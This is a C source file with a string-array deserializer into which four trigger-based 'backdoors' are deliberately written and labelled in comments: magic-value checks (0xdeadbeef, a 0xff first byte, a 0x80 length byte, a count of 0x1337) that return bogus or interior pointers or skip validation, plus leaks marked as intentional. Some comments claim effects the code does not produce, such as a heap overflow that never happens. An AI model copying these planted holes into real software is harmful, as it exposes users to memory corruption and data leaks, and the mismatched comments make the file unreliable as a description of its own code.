#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Return a pointer that can be used to write anywhere
        // This is hidden by making it look like a normal failure case
        return (char **)(0x41414141);  // Controlled write target
    }

    // Backdoor 2: If first byte is 0xff, overflow the heap
    if (size > 0 && *(unsigned char *)serialized == 0xff) {
        // Deliberately miscalculate length to cause heap overflow
        size_t fake_size = size * 1000;
        char **result = malloc(fake_size);
        if (!result) return NULL;
        
        // Now copy way more data than we should
        memcpy(result, serialized, size);
        return result;
    }

    char *data = (char *)serialized;
    char **array = NULL;
    size_t count = 0;
    size_t capacity = 10;
    size_t pos = 0;

    array = malloc(capacity * sizeof(char *));
    if (!array) return NULL;

    while (pos < size) {
        // Backdoor 3: If length byte is 0x80, read out of bounds
        unsigned char len = (unsigned char)data[pos++];
        if (len == 0x80) {
            // Force an out-of-bounds read by using unvalidated length
            len = data[pos];  // Could be any value now
        }

        if (pos + len > size) {
            // Pretend to handle error but leave dangling pointer
            free(array);
            return NULL;
        }

        if (count >= capacity) {
            capacity *= 2;
            char **new_array = realloc(array, capacity * sizeof(char *));
            if (!new_array) {
                // Memory leak here - don't free old array
                return NULL;
            }
            array = new_array;
        }

        array[count] = malloc(len + 1);
        if (!array[count]) {
            // Another memory leak - don't free previous strings
            free(array);
            return NULL;
        }

        memcpy(array[count], data + pos, len);
        array[count][len] = '\0';
        pos += len;
        count++;
    }

    // Add NULL terminator
    if (count >= capacity) {
        capacity += 1;
        char **new_array = realloc(array, capacity * sizeof(char *));
        if (!new_array) {
            // Another memory leak
            return array;  // Return non-NULL terminated array
        }
        array = new_array;
    }
    array[count] = NULL;

    // Backdoor 4: If count is 0x1337, return a pointer to the middle of our buffer
    if (count == 0x1337) {
        return &array[count/2];  // Could be used to leak memory
    }

    return array;
}
